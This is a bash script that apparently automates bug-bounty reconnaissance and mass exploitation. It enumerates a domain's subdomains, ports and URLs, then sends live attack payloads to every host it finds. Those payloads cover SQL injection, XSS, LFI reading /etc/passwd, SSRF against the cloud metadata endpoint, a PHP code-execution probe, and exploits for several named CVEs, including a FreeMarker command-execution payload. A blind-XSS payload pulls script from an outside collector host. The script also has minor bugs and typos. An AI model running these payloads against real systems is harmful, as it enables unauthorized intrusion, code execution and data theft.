#!/bin/bash

# Define variables with descriptive names
base_dir="/home/tr0j3n/Bugbounty/$1"
subdomains_file="$base_dir/dlsubs"
web_content_dir="$base_dir/web-content"
smuggler_dir="$base_dir/smuggler"
scan_dir="$base_dir/scan"
COMMON_PORTS_WEB="81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,9502,9800,9981,10000,10250,11371,12443,15672,16080,17778,18091,18092,20720,32000,55440,55672"
gf_dir="$scan_dir/gf"
openredirex_payloads="/home/tr0j3n/tools/OpenRedireX/payloads.txt"
payloads_ssi="/home/tr0j3n/tools/SecLists/Fuzzing/SSI-Injection-Jhaddix.txt"
payloads_lfi="/home/tr0j3n/tools/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
server_ip="tr0j3n.requestcatcher.com"
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

# Check for valid arguments and display usage
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <domain>"
    exit 1
fi

# Create directories if they don't exist
mkdir -p "$web_content_dir" "$smuggler_dir" "$scan_dir" "$gf_dir"

echo "********** Start Enumerating SubDomains **********"

# Passive subdomains
cat "$subdomains_file" | assetfinder -subs-only | tee "$base_dir/asset"
subfinder -dL "$subdomains_file" | tee "$base_dir/subfi"

# Active subdomains
for i in $(cat $subdomains_file)
do
puredns bruteforce /home/tr0j3n/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt  $i -r /home/tr0j3n/resolvers.txt >> $base_dir/puredns
done

sudo gotator -sub puredns -perm /home/tr0j3n/tools/SecLists/Discovery/DNS/namelist.txt -depth 1 -numbers 10 -mindup -adv -md > $base_dir/gotator.txt


cat "$base_dir/subfi" "$base_dir/asset" "$base_dir/gotator.txt" "$base_dir/puredns"  | sort -u | tee "$base_dir/sub"

echo "********** Start Probing Subdomains **********"

# Probing subdomains
cat "$base_dir/sub" | httpx | tee "$base_dir/subs"
sed 's#^https://##' "$base_dir/subs" > "$base_dir/sub2"
sed 's#^http://##' "$base_dir/sub2" > "$base_dir/sub3"

echo "********** Start Subs Enumeration **********"

cat $base_dir/subs | dnsx -silent -cname -resp| tee $base_dir/scan/dnsx_cname
tlsx -l $base_dir/subs -expired -self-signed -mismatched -revoked -untrusted |tee $base_dir/scan/tls_misc
cat $base_dir/subs|tlsx -tls-version -cipher | tee $base_dir/scan/tls_chiper
cat  $base_dir/subs| httpx -csp-probe -status-code -retries 2 -no-color | anew $base_dir/scan/csp_probed.txt | cut -d ' ' -f1 | unfurl -u domains | anew -q $base_dir/scan/csp_subdomains.txt
cat $base_dir/subs | cf-check -d  | tee $scan_dir/cloudflare-check

echo "********** Start URL Enumeration **********"

# URL enumeration
cat "$base_dir/subs" | waybackurls | tee "$base_dir/urls"
gospider -S $base_dir/urls --js -t 50 -d 3 --sitemap --robots -w -r > $base_dir/gospider.txt
sed -i '/^.\{2048\}./d' $base_dir/gospider.txt
# Loop through each domain in dlsubs file
while IFS= read -r domain; do
    # Filter gospider output for URLs containing the domain, extract domains, and append to scrap_subs.txt
    cat "$base_dir/gospider.txt" | grep -Eo 'https?://[^ ]+' | sed 's/]$//' | unfurl -u domains | grep "$domain$" | sort -u >> "$base_dir/scrap_subs.txt"
done < "$base_dir/dlsubs"
puredns resolve $base_dir/scrap_subs.txt -w $base_dir/scrap_subs_resolved.txt -r /home/tr0j3n/resolvers.txt
cat $base_dir/subs | ./home/tr0j3n/tools/AnalyticsRelationships/analyticsrelationships| tee $base_dir/analytic
cat "$base_dir/subs" "$base_dir/urls" | grep .php | sort -u | tee "$base_dir/phpfile"
cat "$base_dir/subs" "$base_dir/urls" | grep .js | sort -u | tee "$base_dir/jsfile"
cat "$base_dir/subs" "$base_dir/urls" | grep admin | sort -u | tee "$base_dir/adminfile"
cat "$base_dir/subs" "$base_dir/urls" | grep api | sort -u | tee "$base_dir/apifile"
cat "$base_dir/urls" | gf xss | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | qsreplace "FUZZ" | tee "$gf_dir/xss" &> /dev/null
cat "$base_dir/urls" | gf lfi | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | tee "$gf_dir/lfi" &> /dev/null
cat "$base_dir/urls" | gf ssrf | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | tee "$gf_dir/ssrf" &> /dev/null
cat "$base_dir/urls" | gf ssti | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | tee "$gf_dir/ssti" &> /dev/null
cat "$base_dir/urls" | gf sqli | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | tee "$gf_dir/sqli" &> /dev/null
cat "$base_dir/urls" | gf redirect | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | tee "$gf_dir/redirect" &> /dev/null
cat "$payloads_ssi" | while read -r line; do cat "$gf_dir/ssti" | qsreplace "$line" | tee "$gf_dir/checkSSTI.txt"; done 2> /dev/null
cat "$payloads_lfi" | while read -r line; do cat "$gf_dir/lfi" | qsreplace "$line" | tee "$gf_dir/checkLFI.txt"; done 2> /dev/null
cat "$gf_dir/ssrf" | qsreplace "$server_ip" | tee "$gf_dir/checkSSRF.txt"
cat "$base_dir/urls" | cut -d"?" -f1 | cut -d"=" -f1 | tee "$gf_dir/checkSensitive.txt"
cat "$gf_dir/redirect" | qsreplace "FUZZ" | tee "$gf_dir/checkRedirect.txt"
cat "$gf_dir/sqli" | qsreplace "FUZZ" | tee "$gf_dir/checkSQLI.txt"
cat "$gf_dir/xss" | Gxxs -p Rxss | dalofx pipe | tee "$scan_dir/gxxs"

cat "$base_dir/urls" | grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b" | tee $base_dir/email_Extractor 

echo "********** Start Port Enumeration **********"

# Port enumeration
sudo unimap --fast-scan -f $base_dir/sub3 --ports $COMMON_PORTS_WEB -q -k --url-output > $base_dir/unimap_common.txt
cat $base_dir/unimap_common.txt| httpx -random-agent -status-code -silent -retries 2 -no-color | cut -d ' ' -f1 | tee $base_dir/unimap
cat sub3 | portmap | tee $base_dir/portmap
sleep 3s

echo "********** Start Injections Scan **********"

#ppfuzz -l $base_dir/subs | tee $base_dir/scan/ppfuzz

sed 's/$/\?__proto__[testparam]=exploit/' "$base_dir/subs" | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' 2> /dev/null | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | tee "$scan_dir/proto.txt" &> /dev/null
cat "$gf_dir/checkSSTI.txt" | xargs -P 100 -I % bash -c "curl -s -L '%' | grep 'check-ssti49' && echo -e '[VULNERABLE] - % \n '" 2> /dev/null | grep "VULNERABLE" | tee "$scan_dir/ssti.txt" &> /dev/null
cat "$gf_dir/checkLFI.txt" | xargs -P 100 -I % bash -c "curl -s -L '%' | grep 'root:' && echo -e '[VULNERABLE] - % \n '" 2> /dev/null | grep "VULNERABLE" | tee "$scan_dir/lfi.txt" &> /dev/null
cat "$base_dir/urls" | sed "s/'/ /g" | sed "s/)/ /g" | sed "s/(/ /g" | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I % -P 50 bash -c "curl -ks '%' | grep 'compute.internal' && echo -e '[VULNERABLE] - % \n '" 2> /dev/null | grep "VULNERABLE" | tee "$scan_dir/ssrf.txt" &> /dev/null
ffuf -w "$gf_dir/checkSSRF.txt" -u FUZZ -p "0.6-1.2" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" -t 50 -s | tee "$scan_dir/ssrf_fuff" &> /dev/null
cat "$gf_dir/checkSensitive.txt" | grep -E "([^.]+)\.zip$|([^.]+)\.zip\.[0-9]+$|([^.]+)\.zip[0-9]+$|([^.]+)\.zip[a-z][A-Z][0-9]+$|([^.]+)\.zip\.[a-z][A-Z][0-9]+$|([^.]+)\.rar$|([^.]+)\.tar$|([^.]+)\.tar\.gz$|([^.]+)\.tgz$|([^.]+)\.sql$|([^.]+)\.db$|([^.]+)\.sqlite$|([^.]+)\.pgsql\.txt$|([^.]+)\.mysql\.txt$|([^.]+)\.gz$|([^.]+)\.config$|([^.]+)\.log$|([^.]+)\.bak$|([^.]+)\.backup$|([^.]+)\.bkp$|([^.]+)\.crt$|([^.]+)\.dat$|([^.]+)\.eml$|([^.]+)\.java$|([^.]+)\.lst$|([^.]+)\.key$|([^.]+)\.passwd$|([^.]+)\.pl$|([^.]+)\.pwd$|([^.]+)\.mysql-connect$|([^.]+)\.jar$|([^.]+)\.cfg$|([^.]+)\.dir$|([^.]+)\.orig$|([^.]+)\.bz2$|([^.]+)\.old$|([^.]+)\.vbs$|([^.]+)\.img$|([^.]+)\.inf$|([^.]+)\.sh$|([^.]+)\.py$|([^.]+)\.vbproj$|([^.]+)\.mysql-pconnect$|([^.]+)\.war$|([^.]+)\.go$|([^.]+)\.psql$|([^.]+)\.sql\.gz$|([^.]+)\.vb$|([^.]+)\.webinfo$|([^.]+)\.jnlp$|([^.]+)\.cgi$|([^.]+)\.temp$|([^.]+)\.ini$|([^.]+)\.webproj$|([^.]+)\.xsql$|([^.]+)\.raw$|([^.]+)\.inc$|([^.]+)\.lck$|([^.]+)\.nz$|([^.]+)\.rc$|([^.]+)\.html\.gz$|([^.]+)\.gz$|([^.]+)\.env$|([^.]+)\.yml$" | tee "$scan_dir/sensitive"
cat "$gf_dir/redirect" | grep -a -i "=http" | qsreplace "http://www.evil.com/" | xargs -P 50 -I % bash -c "curl -s -L '%' -I | grep 'evil.com' && echo -e '[VULNERABLE] - % \n '" 2> /dev/null | grep "VULNERABLE" | tee "$scan_dir/redirect.txt" &> /dev/null
cat "$gf_dir/xss" | qsreplace "\"><img src=x onerror=confirm(document.domain)>" | xargs -P 50 -I % bash -c "curl -s -L '%' | grep '<img src=x onerror=confirm(document.domain)>' && echo -e '[VULNERABLE] - % \n '" 2> /dev/null | grep "VULNERABLE" | tee "$scan_dir/xss.txt" &> /dev/null
cat "$gf_dir/xss" | xargs -P 30 -I % bash -c 'echo "%" | kxss' 2> /dev/null | anew -q $scan_dir/kxss.txt &> /dev/null
cat "$gf_dir/sqli" | qsreplace "'\"" | xargs -P 50 -I % bash -c "curl -s -L '%' | grep 'You have an error in your SQL syntax' && echo -e '[VULNERABLE] - % \n '" 2> /dev/null | grep "VULNERABLE" | tee "$scan_dir/sqli.txt" &> /dev/null
cat "$gf_dir/lfi.txt" | awk -F "/" '{print $1}' | sed 's/\[VULNERABLE\] - //g' | sort -u | tee "$scan_dir/lfi-directory.txt"
cat "$gf_dir/sensitive" | awk -F "/" '{print $1}' | sed 's/\[VULNERABLE\] - //g' | sort -u | tee "$scan_dir/info.txt"
cat "$gf_dir/redirect.txt" | awk -F "?" '{print $1}' | sed 's/\[VULNERABLE\] - //g' | sort -u | tee "$scan_dir/open-redirect.txt"
cat $base_dir/subs | httpx -silent -H "X-Forwarded-For:'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
cat $base_dir/subs | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")" | tee $base_dir/getjs_result
cat $base_dir/subs | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent | tee $scan_dir/rce
cat $base_dir/subs | bxss - payload 'javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/tr0j3n155\';document.body.appendChild(a)')' -header "X-Forwarded-For" | tee $scan_dir/bxss
echo "<<<<<<<<<<<<<<<< SubDomains Take Over >>>>>>>>>>>>>>>>"

subjack -w $base_dir/subs -t 100 -timeout 30 -ssl -v -c ~/fingerprints.json -o $base_dir/takeover_results.txt

### widget_tabbedContainer_tab_panel

while IFS= read -r domain; do
    host="$domain"
    curl_output=$(curl -s "http://$host/ajax/render/widget_tabbedcontainer_tab_panel" -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && echo "Vulnerable" || echo "Not Vulnerable")
    if [[ $curl_output == *"Vulnerable"* ]]; then
        printf "$host \033[0;31mVulnerable\n" | tee -a "$scan_dir/widget_tabbedContainer_tab_panel"
    else
        printf "$host \033[0;32mNot Vulnerable\n" 
    fi
done < "$base_dir/subs"
echo " <<<<<<<<<<<<< Start Check Unauthenticated Cache Purge  >>>>>>>>>>>>"

for url in $(cat $base_dir/subs); do response=$(curl -s -X PURGE "$url"); if echo "$response" | grep -qi "status : ok"; then echo "Vulnerability found at $url"; fi; done | tee $base_dir/scan/cache_purge

echo " <<<<<<<<<<<<< Start Check F5 Icontrol REST API >>>>>>>>>>>> "

for host in $(cat $base_dir/subs); do
    if curl -sk "https://$host/mgmt/shared/authn/login" | grep -q 'resterrorresponse'; then
        printf "$host \0331;41mF5 iControl REST API Exposed\e[0m\n"
    fi
done | tee | tee $base_dir/scan/f5_icontrol_rest_api


for host in $(cat $base_dir/subs); do
    curl -skL "https://$host/?name={{this.constructor.constructor('alert("foo")')()}}" | grep -q 'name={{this.constructor.constructor('
    if [ $? -eq 0 ]; then
        printf "$host \0331;41mVulnerable to XSS\e[0m\n"
    fi
done | tee $base_dir/scan/XSS

echo " <<<<<<<<<<<<<<< Start Enum For CORS MISC >>>>>>>>>>>>>>>"
for i in $(cat $base_dir/subs); do
  if curl -sIH "Origin: https://evil.com" -X GET "$i" | grep -q 'https://evil.com'; then
    echo "[Potential CORS Found] $i"
  else
    echo "Nothing on $i" 
  fi
done | tee $base_dir/scan/cors

for url in $(cat $base_dir/subs); do curl -s -I "$url" | grep -i 'access-control-allow-origin' >> $scan_dir/cors_access_allow; done

python3 /home/tr0j3n/tools/CORStest/corstest.py $base_dir/subs | tee $scan_dir/cors_test


echo " <<<<<<<<<<<< Start Scan CVES >>>>>>>>>>>>>"
sleep 3s

### CVE-2022-29383
for host in $(cat $base_dir/subs); do
    curl -sk "https://$host/scgi-bin/platform.cgi" --connect-timeout 5 -o /dev/null -w "%{http_code}" | grep -q "200"
    if [ $? -eq 0 ]; then
        printf "$host \0331;41mVulnerable to /scgi-bin/platform.cgi\e[0m\n"
    fi
done | tee $base_dir/scan/CVE-2022-29383

### CVE-2021-26085
for host in $(cat $base_dir/subs); do
    curl -sk "https://$host/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -m 5 -w "%{http_code}" -o /dev/null | grep -q "200"
    if [ $? -eq 0 ]; then
        printf "$host \0331;41mVulnerable to path traversal\e[0m\n"
    fi
done | tee $base_dir/scan/CVE-2021-26085
``
### CVE-2023-23752
cat $base_dir/subs | httpx -silent -path 'api/index.php/v1/config/application?public=true' -mc 200 | tee $base_dir/scan/CVE-2023-23752


### cPanel-CVE-2023-29489

for i in $(cat $base_dir/scan);
do
httpx -silent -ports http:80,https:443,2082,2083 -path 'cpanelwebcall/<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa' -mc 400 ;
done | tee $scan_dir/cPanel-CVE-2023-29489

### Juniper Junos OS J-Web RCE (CVE-2023-36845/CVE-2023-36846)

for i in $(cat $base_dir/subs);
do 
curl -kv "$i/about.php? PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"';
done | tee $scan_dir/juniper_CVE-2023-36845

### CVE-2021-41773

for host in $(cat $base_dir/subs); do
    if curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep -q "root:*"; then
        echo "$host Vulnerable"
    fi
done | tee $base_dir/scan/CVE-2021-41773

### CVE-2020-3452
for i in $(cat $base_dir/subs); do
    if curl -s -k "https://$i/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco"; then
        echo -e "[${GREEN}VULNERABLE${NC}] $i"
    else
        echo -e "[${RED}NOT VULNERABLE${NC}] $i"
    fi
done | tee $base_dir/scan/CVE-2020-3452

### CVE-2022-41040
for i in $(cat $base_dir/subs); do
    if curl -s -k "https://$i/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL" | head | grep -q "IIS Web Core"; then
        echo -e "[${GREEN}VULNERABLE${NC}] $i"
    else
        echo -e "[${RED}NOT VULNERABLE${NC}] $i"
    fi
done | tee $base_dir/scan/CVE-2022-41040
### CVE-2022-0378
for h in $(cat $base_dir/subs); do
    if curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x" | grep -qs "onmouse"; then
        echo "$h: VULNERABLE"
    fi
done | tee $base_dir/scan/CVE-2022-0378



### CVE-2022-22954
for h in $(cat $base_dir/subs); do
    result=$(curl -sk --path-as-is "$h/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/hosts")}" | grep "context")
    if [[ -n "$result" ]]; then
        echo "$h [VULNERABLE]"
    else
        echo "$h [NOT VULNERABLE]"
    fi
done | tee $base_dir/scan/CVE-2022-22954


echo " <<<<<<< Staru Run Tools >>>>>>>>" 
ppfuzz -l $base_dir/subs | tee $base_dir/scan/ppfuzz
crlfuzz -l "$base_dir/subs" -c 50 -s | tee "$scan_dir/crlf"
python3 /home/tr0j3n/tools/OpenRedireX/openredirex.py -l $base_dir/scan/gf/checkRedirect.txt --keyword FUZZ -p /home/tr0j3n/tools/OpenRedireX/payloads.txt 2> /dev/null | grep "^http" | sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | tee $base_dir/scan/Redirext
cat $base_dir/subs | xargs -P 50 -I % bash -c "python3 /home/tr0j3n/tools/smuggler/smuggler.py -u '%' --log $base_dir/scan/smuggle.txt --quiet 2> /dev/null" &> /dev/null
#dalfox file $gf_dir/xss pipe --silence --no-color --no-spinner --mass --mass-worker 100 --ski66666666p-bav -w 50 -b server| tee $scan_dir/dalfox
cat "$gf_dir/xss" | Gxss -p Rxss | dalofx pipe | tee "$scan_dir/gxss"



# CRLF injection scan
crlfuzz -l "$base_dir/subs" -c 50 -s | tee "$scan_dir/crlf"


# Report file paths
echo -e "${GREEN}URLs with Open Redirects: ${RED}$scan_dir/open-redirect.txt${NC}"
echo -e "${GREEN}Sensitive Information Disclosure: ${RED}$scan_dir/info.txt${NC}"
echo -e "${GREEN}Directory Traversal: ${RED}$scan_dir/lfi-directory.txt${NC}"
echo -e "${GREEN}SQL Injection Vulnerabilities: ${RED}$scan_dir/sqli.txt${NC}"
echo -e "${GREEN}Cross-Site Scripting (XSS) Vulnerabilities: ${RED}$scan_dir/xss.txt${NC}"
echo -e "${GREEN}Open Redirects with Parameters: ${RED}$scan_dir/redirect.txt${NC}"

# Clean up temporary files
echo "********** Enumeration Complete **********"
